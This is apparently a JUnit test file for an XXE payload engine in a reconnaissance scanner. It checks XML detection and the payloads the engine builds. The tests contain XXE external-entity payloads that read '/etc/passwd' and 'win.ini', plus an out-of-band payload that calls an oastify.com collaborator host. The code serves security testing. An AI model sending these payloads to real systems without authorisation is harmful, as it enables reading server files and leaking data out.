package com.victor.reconloop;

import org.junit.Test;

import java.util.List;

import static org.junit.Assert.*;

public class XxeEngineTest {

    // ---- isXmlBody ----

    @Test
    public void xmlContentTypesAreRecognised() {
        assertTrue(XxeEngine.isXmlBody("application/xml", ""));
        assertTrue(XxeEngine.isXmlBody("text/xml; charset=utf-8", ""));
        assertTrue(XxeEngine.isXmlBody("application/soap+xml", ""));
        assertTrue(XxeEngine.isXmlBody("APPLICATION/XML", "")); // case-insensitive
    }

    @Test
    public void xmlBodyPrefixIsRecognisedWithoutContentType() {
        assertTrue(XxeEngine.isXmlBody(null, "<?xml version=\"1.0\"?><a/>"));
        assertTrue(XxeEngine.isXmlBody(null, "   \n<?xml version=\"1.0\"?><a/>")); // leading whitespace
        assertTrue(XxeEngine.isXmlBody(null, "<!DOCTYPE note SYSTEM \"note.dtd\"><note/>"));
        assertTrue(XxeEngine.isXmlBody(null, "<!doctype x>")); // case-insensitive DOCTYPE
    }

    @Test
    public void nonXmlBodiesAreNotRecognised() {
        assertFalse(XxeEngine.isXmlBody("application/json", "{\"a\":1}"));
        assertFalse(XxeEngine.isXmlBody("text/html", "<html><body>hi</body></html>")); // bare tag, not XML
        assertFalse(XxeEngine.isXmlBody(null, "<html>"));
        assertFalse(XxeEngine.isXmlBody(null, ""));
        assertFalse(XxeEngine.isXmlBody(null, null));
    }

    // ---- payload construction ----

    @Test
    public void buildPayloadDeclaresAndReferencesTheExternalEntity() {
        String payload = XxeEngine.buildPayload("file:///etc/passwd");
        assertTrue(payload.contains("<!DOCTYPE"));
        assertTrue(payload.contains("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
        assertTrue(payload.contains("&xxe;"));
    }

    @Test
    public void fileReadPayloadsCoverUnixAndWindowsTargets() {
        List<String> ids = XxeEngine.fileReadSystemIds();
        assertTrue(ids.stream().anyMatch(s -> s.contains("/etc/passwd")));
        assertTrue(ids.stream().anyMatch(s -> s.toLowerCase().contains("win.ini")));

        List<String> payloads = XxeEngine.fileReadPayloads();
        assertEquals(ids.size(), payloads.size());
        assertTrue(payloads.stream().anyMatch(p -> p.contains("file:///etc/passwd") && p.contains("&xxe;")));
    }

    @Test
    public void oobPayloadEmbedsTheCollaboratorUrl() {
        String payload = XxeEngine.buildOobPayload("http://abc123.oastify.com/xxe");
        assertTrue(payload.contains("<!ENTITY xxe SYSTEM \"http://abc123.oastify.com/xxe\">"));
        assertTrue(payload.contains("&xxe;"));
    }
}
